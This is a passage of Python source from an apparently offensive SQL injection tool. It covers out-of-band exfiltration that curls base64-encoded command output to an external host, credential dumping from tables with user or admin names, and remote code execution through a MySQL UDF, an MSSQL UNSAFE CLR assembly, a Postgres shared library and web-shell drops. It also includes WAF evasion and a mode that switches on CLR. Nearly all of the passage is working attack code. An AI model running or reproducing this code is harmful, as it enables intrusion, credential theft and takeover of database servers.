    port = oob_config.http_public_port
    url = f"http://{host}:{port}/{marker}"
    return f"curl -s '{url}?o='$({cmd} 2>&1 | base64 -w0)"

# ── END SESSION 2 helpers ────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════════════
# ── SESSION 3a (SHELVED) ── SQLite RCE attempt
# ═══════════════════════════════════════════════════════════════════════

async def _sqlite_attach_write(session, point, limiter, jar,
                                target_path, content,
                                verbose=False, evade=False,
                                baseline_len=None):
    d = _dialect("sqlite")
    alias = "tkout" + secrets.token_hex(3)

    path_esc = d["str_escape"](target_path)
    content_esc = d["str_escape"](content)

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; ATTACH DATABASE '{path_esc}' "
                                  f"AS {alias}--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="sqlite")
    if r is None:
        return False

    body = (r[2] or "").lower()
    for sig in ("unable to open database",
                "readonly database",
                "attempt to write a readonly database",
                "permission denied",
                "already exists"):
        if sig in body:
            if verbose:
                warn(f"  sqlite ATTACH failed: matched {sig!r}")
            return False

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; CREATE TABLE {alias}.p (c TEXT)--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="sqlite")
    if r is None:
        return False

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; INSERT INTO {alias}.p VALUES "
                                  f"('{content_esc}')--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="sqlite")
    if r is None:
        return False

    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; DETACH DATABASE {alias}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="sqlite")
    if r is None:
        return False

    if verbose:
        info(f"  sqlite ATTACH: database written to {target_path} "
             f"(note: not raw text — SQLite writes a structured DB)")
    return True


async def _sqlite_load_extension_probe(session, point, limiter, jar,
                                        extract_fn, verbose=False,
                                        evade=False, baseline_len=None):
    bogus_path = "/tmp/tk_no_such_lib_" + secrets.token_hex(4) + ".so"
    payload = f"; SELECT load_extension('{bogus_path}')--"
    r = await _send(session, point, limiter, jar,
                    raw_payload=payload, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms="sqlite")
    if r is None:
        return None

    body = (r[2] or "").lower()
    if "not authorized" in body:
        if verbose:
            info("  sqlite load_extension: NOT AUTHORIZED (app disabled)")
        return False
    if ("cannot open shared library" in body
            or "no such file" in body
            or "cannot open" in body
            or "not found" in body):
        if verbose:
            success("  sqlite load_extension: AVAILABLE (UDF path viable)")
        return True
    if verbose:
        info(f"  sqlite load_extension: inconclusive "
             f"(response did not match known signatures)")
    return None


async def _drop_sqlite_shell(session, point, limiter, jar,
                              shell_path=None, verbose=False,
                              evade=False, baseline_len=None,
                              base_url=None):
    result = {
        "success": False,
        "shell_url": None,
        "shell_path": None,
        "shell_kind": "py",
        "writable_root": None,
        "verified": False,
        "error": ("SQLite has no default file-write primitive. "
                  "ATTACH DATABASE writes a structured DB file, not "
                  "a script an interpreter can execute."),
    }

    if shell_path:
        wrote = await _sqlite_attach_write(
            session, point, limiter, jar,
            target_path=shell_path,
            content="tk-write-probe",
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if wrote:
            result["shell_path"] = shell_path
            result["error"] = (
                "filesystem write access confirmed (via ATTACH "
                "DATABASE), but SQLite cannot write raw text — no "
                "usable shell can be produced on this target."
            )

    return result

# ── END SESSION 3a helpers ───────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════════════
# ── SESSION 3b ── UDF / CLR / plugin RCE (MySQL, MSSQL, Postgres)
# ═══════════════════════════════════════════════════════════════════════

def _compile_rce_payload(kind: str, verbose: bool = False):
    try:
        from payload import rce
    except ImportError as e:
        if verbose:
            warn(f"  payload.rce package not available: {e}")
        return None

    try:
        if kind == "mysql_udf":
            return rce.build_mysql_udf()
        if kind == "mssql_clr":
            return rce.build_mssql_clr()
        if kind == "pg_so":
            return rce.build_postgres_so()
    except rce.ToolchainMissing as e:
        warn(f"  cannot compile {kind}: {e}")
        return None
    except rce.CompileError as e:
        warn(f"  {kind} compilation failed: {e}")
        return None

    if verbose:
        warn(f"  unknown RCE payload kind: {kind}")
    return None


# ---- MySQL UDF -----------------------------------------------------

async def _mysql_plugin_dir(session, point, wrap, limiter, jar, extract_fn,
                             verbose=False, evade=False, baseline_len=None):
    expr = "@@plugin_dir"
    try:
        val = await extract_fn(expr, "mysql plugin_dir")
    except Exception as e:
        if verbose:
            warn(f"  plugin_dir probe failed: {type(e).__name__}: {e}")
        val = ""

    if val:
        val = val.strip()
        if not val.endswith("/"):
            val += "/"
        return val

    if verbose:
        info("  plugin_dir unreadable; defaulting to /usr/lib/mysql/plugin/")
    return "/usr/lib/mysql/plugin/"


async def _mysql_write_binary(session, point, limiter, jar, path, data,
                               verbose=False, evade=False, baseline_len=None):
    import binascii

    hex_data = "0x" + binascii.hexlify(data).decode("ascii")
    path_esc = _dialect("mysql")["str_escape"](path)

    sql = f"SELECT {hex_data} INTO DUMPFILE '{path_esc}'"
    wrapped = wrap_stack(sql, _dialect("mysql"))

    r = await _send(session, point, limiter, jar,
                    raw_payload=wrapped, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms="mysql")
    if r is None:
        return False

    body = (r[2] or "").lower()
    for sig in ("can't create", "file exists", "access denied",
                "secure_file_priv", "permission denied"):
        if sig in body:
            if verbose:
                warn(f"  INTO DUMPFILE failed: matched {sig!r}")
            return False

    if verbose:
        success(f"  INTO DUMPFILE: wrote {len(data)} bytes to {path}")
    return True


async def _mysql_install_udf_functions(session, point, limiter, jar,
                                        soname,
                                        verbose=False, evade=False,
                                        baseline_len=None):
    d = _dialect("mysql")
    soname_esc = d["str_escape"](soname)

    for fn, ret in (("sys_exec", "INTEGER"), ("sys_eval", "STRING")):
        await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP FUNCTION IF EXISTS {fn}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mysql")
        sql = (f"CREATE FUNCTION {fn} RETURNS {ret} "
               f"SONAME '{soname_esc}'")
        r = await _send(session, point, limiter, jar,
                        raw_payload=f"; {sql}--",
                        evade=evade, baseline_len=baseline_len,
                        verbose=verbose, dbms="mysql")
        if r is None:
            return False
        body = (r[2] or "").lower()
        if "error" in body or "denied" in body:
            if verbose:
                warn(f"  CREATE FUNCTION {fn} failed")
            return False
        if verbose:
            info(f"  installed {fn}()")

    return True


async def _mysql_udf_run_cmd(session, point, wrap, limiter, jar, cmd,
                              extract_fn, verbose=False, evade=False,
                              baseline_len=None):
    d = _dialect("mysql")

    udf_bytes = _compile_rce_payload("mysql_udf", verbose=verbose)
    if udf_bytes is None:
        return None
    if verbose:
        info(f"  compiled UDF: {len(udf_bytes)} bytes")

    plugin_dir = await _mysql_plugin_dir(
        session, point, wrap, limiter, jar, extract_fn,
        verbose=verbose, evade=evade, baseline_len=baseline_len)

    soname = f"tk_udf_{secrets.token_hex(4)}.so"
    remote_path = plugin_dir + soname
    if verbose:
        info(f"  target path: {remote_path}")

    ok = await _mysql_write_binary(
        session, point, limiter, jar, remote_path, udf_bytes,
        verbose=verbose, evade=evade, baseline_len=baseline_len)
    if not ok:
        return None

    ok = await _mysql_install_udf_functions(
        session, point, limiter, jar, soname,
        verbose=verbose, evade=evade, baseline_len=baseline_len)
    if not ok:
        return None

    cmd_esc = d["str_escape"](cmd)
    expr = f"(SELECT sys_eval('{cmd_esc}'))"
    try:
        out = await extract_fn(expr, "sys_eval output")
    except Exception as e:
        warn(f"  sys_eval extraction failed: {type(e).__name__}: {e}")
        return ""

    if verbose and out:
        info(f"  sys_eval output ({len(out)}B): {out[:120]!r}")
    return out if out is not None else ""


# ---- MSSQL CLR -----------------------------------------------------

async def _mssql_clr_enabled(session, point, wrap, limiter, jar, extract_fn,
                              verbose=False, evade=False, baseline_len=None):
    expr = ("(SELECT CONVERT(int, value_in_use) FROM sys.configurations "
            "WHERE name='clr enabled')")
    try:
        val = await extract_fn(expr, "clr enabled status")
    except Exception as e:
        if verbose:
            warn(f"  CLR probe failed: {type(e).__name__}: {e}")
        return None

    if not val:
        return None
    val = val.strip()
    if val == "1":
        if verbose:
            success("  CLR: ENABLED")
        return True
    if val == "0":
        if verbose:
            info("  CLR: DISABLED (enable with --aggressive)")
        return False
    return None


async def _mssql_enable_clr(session, point, limiter, jar,
                             verbose=False, evade=False, baseline_len=None):
    info("  attempting to enable CLR (aggressive mode)")
    stmts = [
        "EXEC sp_configure 'show advanced options', 1",
        "RECONFIGURE",
        "EXEC sp_configure 'clr enabled', 1",
        "RECONFIGURE",
    ]
    for stmt in stmts:
        r = await _send(session, point, limiter, jar,
                        raw_payload=f"; {stmt}--",
                        evade=evade, baseline_len=baseline_len,
                        verbose=verbose, dbms="mssql")
        if r is None:
            return False
        body = (r[2] or "").lower()
        if "denied" in body or "permission" in body:
            warn(f"  CLR enable denied: {stmt[:60]}")
            return False
    success("  CLR enable sequence sent")
    return True


async def _mssql_install_clr(session, point, limiter, jar, dll_bytes,
                              verbose=False, evade=False, baseline_len=None):
    import binascii
    hex_data = "0x" + binascii.hexlify(dll_bytes).decode("ascii")

    await _send(session, point, limiter, jar,
                raw_payload="; DROP PROCEDURE IF EXISTS tk_cmd--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")
    await _send(session, point, limiter, jar,
                raw_payload="; DROP ASSEMBLY IF EXISTS tk_clr--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")

    sql = (f"CREATE ASSEMBLY tk_clr FROM {hex_data} "
           f"WITH PERMISSION_SET = UNSAFE")
    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; {sql}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return False
    body = (r[2] or "").lower()
    if "error" in body or "denied" in body:
        if verbose:
            warn("  CREATE ASSEMBLY failed")
        return False

    sql = ("CREATE PROCEDURE tk_cmd @cmd NVARCHAR(MAX) "
           "AS EXTERNAL NAME tk_clr.CmdExec.Run")
    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; {sql}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return False
    body = (r[2] or "").lower()
    if "error" in body or "denied" in body:
        if verbose:
            warn("  CREATE PROCEDURE failed")
        return False

    if verbose:
        success("  CLR assembly + procedure installed")
    return True


async def _mssql_clr_run_cmd(session, point, wrap, limiter, jar, cmd,
                              extract_fn, aggressive=False,
                              verbose=False, evade=False,
                              baseline_len=None):
    d = _dialect("mssql")

    clr_bytes = _compile_rce_payload("mssql_clr", verbose=verbose)
    if clr_bytes is None:
        return None
    if verbose:
        info(f"  compiled CLR: {len(clr_bytes)} bytes")

    enabled = await _mssql_clr_enabled(
        session, point, wrap, limiter, jar, extract_fn,
        verbose=verbose, evade=evade, baseline_len=baseline_len)
    if enabled is False and aggressive:
        if await _mssql_enable_clr(session, point, limiter, jar,
                                    verbose=verbose, evade=evade,
                                    baseline_len=baseline_len):
            enabled = True
    if enabled is False:
        return None

    ok = await _mssql_install_clr(
        session, point, limiter, jar, clr_bytes,
        verbose=verbose, evade=evade, baseline_len=baseline_len)
    if not ok:
        return None

    tbl = RCE_TABLE_PREFIX + secrets.token_hex(4)
    cmd_esc = d["str_escape"](cmd)

    await _send(session, point, limiter, jar,
                raw_payload=f"; DROP TABLE IF EXISTS {tbl}--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")
    await _send(session, point, limiter, jar,
                raw_payload=f"; CREATE TABLE {tbl} (line NVARCHAR(MAX))--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")
    await _send(session, point, limiter, jar,
                raw_payload=(f"; INSERT INTO {tbl} EXEC tk_cmd "
                              f"@cmd = '{cmd_esc}'--"),
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")

    agg = d["concat"](["'"+RCE_SENTINEL_A+"'",
                       "string_agg(ISNULL(line,''), char(10))",
                       "'"+RCE_SENTINEL_B+"'"])
    expr = f"(SELECT {agg} FROM {tbl})"
    try:
        raw = await extract_fn(expr, "CLR output")
    except Exception as e:
        warn(f"  CLR output extraction failed: {type(e).__name__}: {e}")
        raw = ""

    output = _strip_rce_sentinels(raw)

    await _send(session, point, limiter, jar,
                raw_payload=f"; DROP TABLE {tbl}--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="mssql")

    if verbose and output:
        info(f"  CLR output ({len(output)}B): {output[:120]!r}")
    return output if output else ""


# ---- Postgres shared library ---------------------------------------

async def _postgres_write_so(session, point, wrap, limiter, jar, so_bytes,
                              remote_path, extract_fn,
                              verbose=False, evade=False, baseline_len=None):
    import binascii
    hex_data = binascii.hexlify(so_bytes).decode("ascii")

    oid_expr = "(SELECT lo_create(0))"
    try:
        oid_val = await extract_fn(oid_expr, "lo_create oid")
    except Exception as e:
        warn(f"  lo_create failed: {type(e).__name__}: {e}")
        return False

    if not oid_val:
        return False
    oid_val = oid_val.strip()
    if not oid_val.isdigit():
        if verbose:
            warn(f"  lo_create returned non-numeric: {oid_val!r}")
        return False

    oid = int(oid_val)
    if verbose:
        info(f"  large object oid: {oid}")

    fd_expr = f"(SELECT lo_open({oid}, 131072))"
    try:
        fd_val = await extract_fn(fd_expr, "lo_open fd")
    except Exception as e:
        warn(f"  lo_open failed: {type(e).__name__}: {e}")
        return False
    if not fd_val:
        return False
    fd_val = fd_val.strip()
    if not fd_val.lstrip("-").isdigit():
        if verbose:
            warn(f"  lo_open returned non-numeric: {fd_val!r}")
        return False

    fd = int(fd_val)

    window_hex = 256 * 1024
    written = 0
    for i in range(0, len(hex_data), window_hex):
        chunk = hex_data[i:i + window_hex]
        stmt = (f"; SELECT lowrite({fd}, decode('{chunk}', 'hex'))--")
        r = await _send(session, point, limiter, jar,
                        raw_payload=stmt, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms="postgres")
        if r is None:
            return False
        written += len(chunk) // 2

    await _send(session, point, limiter, jar,
                raw_payload=f"; SELECT lo_close({fd})--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="postgres")

    path_esc = _dialect("postgres")["str_escape"](remote_path)
    stmt = f"; SELECT lo_export({oid}, '{path_esc}')--"
    r = await _send(session, point, limiter, jar,
                    raw_payload=stmt, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms="postgres")
    if r is None:
        return False

    if verbose:
        success(f"  lo_export: wrote {written} bytes to {remote_path}")
    return True


async def _postgres_install_so_function(session, point, limiter, jar,
                                         remote_path,
                                         verbose=False, evade=False,
                                         baseline_len=None):
    d = _dialect("postgres")
    path_esc = d["str_escape"](remote_path)

    await _send(session, point, limiter, jar,
                raw_payload="; DROP FUNCTION IF EXISTS pg_cmd_exec(text)--",
                evade=evade, baseline_len=baseline_len,
                verbose=verbose, dbms="postgres")

    sql = (f"CREATE FUNCTION pg_cmd_exec(text) RETURNS text "
           f"AS '{path_esc}', 'pg_cmd_exec' LANGUAGE C STRICT")
    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; {sql}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="postgres")
    if r is None:
        return False
    body = (r[2] or "").lower()
    if "error" in body or "denied" in body:
        if verbose:
            warn("  CREATE FUNCTION failed")
        return False
    if verbose:
        success("  pg_cmd_exec() installed")
    return True


async def _postgres_so_run_cmd(session, point, wrap, limiter, jar, cmd,
                                extract_fn, verbose=False, evade=False,
                                baseline_len=None):
    d = _dialect("postgres")
    so_bytes = _compile_rce_payload("pg_so", verbose=verbose)
    if so_bytes is None:
        return None
    if verbose:
        info(f"  compiled Postgres .so: {len(so_bytes)} bytes")

    remote_path = f"/tmp/tk_pg_{secrets.token_hex(4)}.so"
    ok = await _postgres_write_so(
        session, point, wrap, limiter, jar, so_bytes, remote_path,
        extract_fn, verbose=verbose, evade=evade, baseline_len=baseline_len)
    if not ok:
        return None

    ok = await _postgres_install_so_function(
        session, point, limiter, jar, remote_path,
        verbose=verbose, evade=evade, baseline_len=baseline_len)
    if not ok:
        return None

    cmd_esc = d["str_escape"](cmd)
    expr = f"(SELECT pg_cmd_exec('{cmd_esc}'))"
    try:
        out = await extract_fn(expr, "pg_cmd_exec output")
    except Exception as e:
        warn(f"  pg_cmd_exec extraction failed: {type(e).__name__}: {e}")
        return ""

    if verbose and out:
        info(f"  pg_cmd_exec output ({len(out)}B): {out[:120]!r}")
    return out if out is not None else ""


# ---- Dispatcher ----------------------------------------------------

async def _session3b_run_os_command(session, point, wrap, limiter, jar, dbms,
                                     cmd, extract_fn, aggressive=False,
                                     verbose=False, evade=False,
                                     baseline_len=None):
    if dbms == "mysql":
        out = await _mysql_udf_run_cmd(
            session, point, wrap, limiter, jar, cmd, extract_fn,
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if out is not None:
            return {"method": "mysql_udf", "cmd": cmd, "output": out}

    elif dbms == "mssql":
        out = await _mssql_clr_run_cmd(
            session, point, wrap, limiter, jar, cmd, extract_fn,
            aggressive=aggressive,
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if out is not None:
            return {"method": "mssql_clr", "cmd": cmd, "output": out}

    elif dbms == "postgres":
        out = await _postgres_so_run_cmd(
            session, point, wrap, limiter, jar, cmd, extract_fn,
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if out is not None:
            return {"method": "postgres_so", "cmd": cmd, "output": out}

    return None

# ── END SESSION 3b helpers ───────────────────────────────────────────


# ---------------------------------------------------------------------
# Asset orchestration
# ---------------------------------------------------------------------

async def extract_vulnerable_database_assets(session, point, limiter,
                                             dbms, jar=None, verbose=False,
                                             allow_stacked=True,
                                             evade=False, baseline_len=None,
                                             baseline_hash=None,
                                             oob_config=None,
                                             want_shell=False,
                                             aggressive=False):
    d = _dialect(dbms)
    assets = {}
    assets["_want_shell"] = want_shell
    point = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        point.cookies, dbms,
    )

    if await detect_reflection(session, point, limiter, jar, verbose,
                               evade, baseline_len, baseline_hash):
        assets["reflection_suspected"] = True
        info(f"  {point.name!r} reflects payloads; skipping extraction "
             f"to avoid false-positive results")
        return assets


    ctx_name, wrap, oracle_kind, oracle_state = await detect_context(
        session, point, limiter, dbms, jar=jar, verbose=verbose,
        evade=evade, baseline_len=baseline_len)
    if ctx_name is None:
        assets["oracle_opaque"] = True
        return assets
    info(f"context: {ctx_name} (oracle={oracle_kind})")

    base_r = await _send(session, point, limiter, jar, raw_payload=None,
                         evade=False, baseline_len=baseline_len,
                         verbose=verbose, dbms=dbms)
    baseline_body = base_r[2] if base_r else ""

    n_cols, printable_idx = await detect_union(
        session, point, ctx_name, limiter, dbms, baseline_body,
        jar=jar, verbose=verbose, evade=evade, baseline_len=baseline_len)

    union_ok = False
    if n_cols is not None:
        test = await union_extract(session, point, ctx_name, limiter,
                                   n_cols, printable_idx, d["version"], dbms,
                                   jar=jar, label="union probe",
                                   verbose=verbose, evade=evade,
                                   baseline_len=baseline_len)
        if test and len(test) >= 2:
            union_ok = True
        else:
            if verbose:
                warn("union probe returned <2 bytes; disabling union path")
            n_cols, printable_idx = None, None

    err_func = None
    if dbms in ("mysql", "mssql", "oracle"):
        err_func = await detect_error_oracle(
            session, point, wrap, limiter, dbms, jar=jar, verbose=verbose,
            evade=evade, baseline_len=baseline_len)
        if err_func:
            assets["error_oracle"] = err_func

    async def extract(query, label):
        if union_ok:
            val = await union_extract(session, point, ctx_name, limiter,
                                      n_cols, printable_idx, query, dbms,
                                      jar=jar, label=label, verbose=verbose,
                                      evade=evade, baseline_len=baseline_len)
            if val and len(val) >= 2:
                return val
            if verbose:
                warn(f"{label}: union returned short value, trying error")
        if err_func:
            val = await error_extract(session, point, wrap, limiter,
                                      err_func, query, dbms,
                                      jar=jar, label=label, verbose=verbose,
                                      evade=evade, baseline_len=baseline_len)
            if val:
                return val
            if verbose:
                warn(f"{label}: error oracle returned empty, falling back to blind")
        return await extract_sql_data(session, point, wrap, limiter,
                                      oracle_kind, oracle_state,
                                      query, dbms, jar=jar, label=label,
                                      verbose=verbose, evade=evade,
                                      baseline_len=baseline_len)

    banner = await extract(d["version"], "DB Banner")
    if banner:
        assets["db_version"] = banner
        success(f"DB Banner: {banner}")

    tables, tables_truncated = await _paginate_extract(
        extract, d["tables_page_query"], dbms, "Tables", verbose=verbose)
    assets["tables_truncated"] = tables_truncated
    if not tables:
        return assets
    assets["tables"] = tables
    success(f"Tables ({len(tables)}): {', '.join(tables[:8])}"
            + ("..." if len(tables) > 8 else ""))

    target = next((t for t in tables
                   if any(k in t.lower() for k in
                          ("admin", "user", "account", "credential",
                           "staff", "member", "pass"))), None)
    if not target:
        return assets

    cols_raw = await extract(d["columns_query"](d["str_escape"](target)),
                             f"Columns of {target}")
    columns = [c for c in cols_raw.split(GC_SEP) if c] if cols_raw else []
    assets["target_table_columns"] = columns

    user_col = next((c for c in columns
                     if any(k in c.lower()
                            for k in ("user", "login", "email", "name"))), None)
    pass_col = next((c for c in columns
                     if any(k in c.lower()
                            for k in ("pass", "pwd", "secret", "hash"))), None)
    if not (user_col and pass_col):
        return assets

    ident_t = _ident(target, d)
    ident_u = _ident(user_col, d)
    ident_p = _ident(pass_col, d)
    concat_expr = d["concat"]([ident_u, "':'", ident_p])

    if dbms == "mysql":
        cred_page_template = (
            f"SELECT group_concat(c SEPARATOR 0x1f) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    elif dbms == "postgres":
        cred_page_template = (
            f"SELECT string_agg(c, chr(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    elif dbms == "mssql":
        cred_page_template = (
            f"SELECT string_agg(c, char(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"ORDER BY {ident_u} "
            f"OFFSET {{offset}} ROWS FETCH NEXT {{limit}} ROWS ONLY) x")
    elif dbms == "sqlite":
        cred_page_template = (
            f"SELECT group_concat(c, char(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    else:
        cred_page_template = (
            f"SELECT listagg(c, chr(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"ORDER BY {ident_u} "
            f"OFFSET {{offset}} ROWS FETCH NEXT {{limit}} ROWS ONLY) x")

    creds, creds_truncated = await _paginate_extract(
        extract, cred_page_template, dbms, "Credentials", verbose=verbose)
    assets["credentials_truncated"] = creds_truncated
    if creds:
        assets["credentials"] = creds
        success(f"Credentials ({len(creds)})")
        for c in creds:
            success(f"  {c}")

    if allow_stacked:
        assets["stacked_supported"] = await detect_stacked(
            session, point, wrap, limiter, dbms, jar=jar, verbose=verbose,
            evade=evade, baseline_len=baseline_len)

    if oob_config is not None and not assets.get("credentials"):
        oob_result = await extract_oob(
            session, point, limiter, dbms, oob_config,
            jar=jar, verbose=verbose, baseline_len=baseline_len)
        if oob_result:
            assets["oob"] = oob_result

    # ── SESSION 1+2+3a+3b ── Post-exploitation: shell and/or RCE ────
    if want_shell and not assets.get("shell") and not assets.get("rce"):

        if dbms == "postgres":
            recon_cmd = RCE_RECON_CMD_LINUX
            rce = await _run_os_command(
                session, point, wrap, limiter, jar, dbms, recon_cmd,
                extract, oob_config=oob_config, aggressive=aggressive,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if rce:
                assets["rce"] = rce
                success(f"RCE via {rce['method']}: "
                        f"{rce['output'][:80]!r}")
            else:
                if verbose:
                    info("  COPY TO PROGRAM unavailable; "
                         "trying Session 3b shared library")
                rce = await _session3b_run_os_command(
                    session, point, wrap, limiter, jar, dbms, recon_cmd,
                    extract, aggressive=aggressive,
                    verbose=verbose, evade=evade,
                    baseline_len=baseline_len)
                if rce:
                    assets["rce"] = rce
                    success(f"RCE via {rce['method']}: "
                            f"{rce['output'][:80]!r}")
                else:
                    assets["shell"] = await _drop_web_shell(
                        session, point, limiter, dbms, jar=jar,
                        verbose=verbose, evade=evade,
                        baseline_len=baseline_len,
                        base_url=point.url)
                    if assets["shell"].get("success"):
                        sh = assets["shell"]
                        if sh.get("shell_url"):
                            ok = await _verify_web_shell(
                                session, sh["shell_url"], limiter,
                                verbose=verbose)
                            sh["verified"] = ok
                            if ok:
                                success(f"web shell confirmed: "
                                        f"{sh['shell_url']}")

        elif dbms == "mssql":
            recon_cmd = RCE_RECON_CMD_WINDOWS
            rce = await _run_os_command(
                session, point, wrap, limiter, jar, dbms, recon_cmd,
                extract, oob_config=oob_config, aggressive=aggressive,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if rce:
                assets["rce"] = rce
                success(f"RCE via {rce['method']}: "
                        f"{rce['output'][:80]!r}")
            else:
                if verbose:
                    info("  xp_cmdshell and sp_oacreate both failed; "
                         "trying Session 3b CLR assembly")
                rce = await _session3b_run_os_command(
                    session, point, wrap, limiter, jar, dbms, recon_cmd,
                    extract, aggressive=aggressive,
                    verbose=verbose, evade=evade,
                    baseline_len=baseline_len)
                if rce:
                    assets["rce"] = rce
                    success(f"RCE via {rce['method']}: "
                            f"{rce['output'][:80]!r}")

        elif dbms == "mysql":
            assets["shell"] = await _drop_web_shell(
                session, point, limiter, dbms, jar=jar,
                verbose=verbose, evade=evade,
                baseline_len=baseline_len,
                base_url=point.url)
            if assets["shell"].get("success"):
                sh = assets["shell"]
                if sh.get("shell_url"):
                    ok = await _verify_web_shell(
                        session, sh["shell_url"], limiter,
                        verbose=verbose)
                    sh["verified"] = ok
                    if ok:
                        success(f"web shell confirmed: "
                                f"{sh['shell_url']}")
            else:
                if verbose:
                    info("  INTO OUTFILE failed; "
                         "trying Session 3b UDF injection")
                recon_cmd = RCE_RECON_CMD_LINUX
                rce = await _session3b_run_os_command(
                    session, point, wrap, limiter, jar, dbms, recon_cmd,
                    extract, aggressive=aggressive,
                    verbose=verbose, evade=evade,
                    baseline_len=baseline_len)
                if rce:
                    assets["rce"] = rce
                    success(f"RCE via {rce['method']}: "
                            f"{rce['output'][:80]!r}")

        elif dbms == "sqlite":
            ext_available = await _sqlite_load_extension_probe(
                session, point, limiter, jar, extract,
                verbose=verbose, evade=evade,
                baseline_len=baseline_len)
            if ext_available is not None:
                assets["sqlite_load_extension"] = ext_available

            if ext_available is True:
                assets["shell_skipped"] = (
                    "sqlite load_extension is ENABLED, but Session 3b "
                    "does not ship a compiled SQLite UDF for this "
                    "target. RCE via SQLite is possible with the "
                    "right .so but requires a platform-specific build."
                )
            else:
                assets["shell_skipped"] = (
                    "SQLite has no default file-write primitive. "
                    "ATTACH DATABASE writes a structured DB file, not "
                    "a script an interpreter can execute. RCE via "
                    "SQLite SQLi is not possible on this target."
                )

        else:
            assets["shell_skipped"] = (
                f"{dbms} is not supported by Sessions 1-3b"
            )
            if verbose:
                info(f"  skipping shell/RCE: {assets['shell_skipped']}")
    # ── END SESSION 1+2+3a+3b ────────────────────────────────────────

    return assets


# ---------------------------------------------------------------------
# Main runner
# ---------------------------------------------------------------------

def _normalize_cookies(cookies):
    if cookies is None:
        return None
    if isinstance(cookies, str):
        return parse_cookie_string(cookies)
    return cookies


async def test_url(url, session, rate_limiter, cookies=None, verbose=False,
                   auto_extract=True, include_headers=False,
                   method="GET", body=None, content_type=None,
                   allow_stacked=True, evade=False, blind_probe=True,
                   oob_config=None, drop_shell=False,
                   aggressive=False):
    if not url:
        return []

    cookies = _normalize_cookies(cookies)
    limiter = AdaptiveLimiter(rate_limiter)
    jar = TokenJar()

    try:
        base = await _send(session,
                           InjectionPoint("query", "", url, method,
                                          cookies=cookies, body=body,
                                          content_type=content_type),
                           limiter, jar, raw_payload=None)
    except Exception as e:
        if verbose:
            warn(f"baseline fetch failed: {type(e).__name__}: {e!r}")
        return []
    if base is None:
        return []

    baseline_len = len(base[2]) if base[2] else None
    baseline_hash = _hash(base[2]) if base[2] else None

    global _LAST_WAF_FINGERPRINT
    if evade:
        _LAST_WAF_FINGERPRINT = await fingerprint_waf(
            session, url, limiter, cookies=cookies, verbose=verbose)

    found = find_tokens(base[2], base[1])
    if found:
        jar.update(found)
        if verbose:
            info(f"csrf: cached {len(found)} token(s) from baseline: "
                 f"{', '.join(found.keys())}")
    else:
        seed_point = InjectionPoint("query", "", url, method,
                                    cookies=cookies, body=body,
                                    content_type=content_type)
        await refresh_tokens(session, seed_point, jar, limiter, verbose=verbose)

    base_errors = set()
    low = base[2].lower()
    for sig in ERROR_SIGNATURES:
        if sig in low:
            base_errors.add(sig)

    points = []
    parsed = urlparse(url)
    for name in parse_qs(parsed.query, keep_blank_values=True).keys():
        points.append(InjectionPoint("query", name, url, method,
                                     cookies=cookies, body=body,
                                     content_type=content_type))
    if body:
        ct = (content_type or "").lower()
        if "json" in ct:
            try:
                obj = _json.loads(body)
                if isinstance(obj, dict):
                    for name in obj:
                        points.append(InjectionPoint("body", name, url, method,
                                                     cookies=cookies, body=body,
                                                     content_type=content_type))
            except Exception:
                pass
        else:
            for name in parse_qs(body, keep_blank_values=True).keys():
                points.append(InjectionPoint("body", name, url, method,
                                             cookies=cookies, body=body,
                                             content_type=content_type))
    if cookies:
        for cname in cookies:
            points.append(InjectionPoint("cookie", cname, url, method,
                                         cookies=cookies, body=body,
                                         content_type=content_type))
    if include_headers:
        for h in ("X-Forwarded-For", "Referer", "X-Real-IP"):
            points.append(InjectionPoint("header", h, url, method,
                                         headers={h: "1"}, cookies=cookies,
                                         body=body, content_type=content_type))

    if not points:
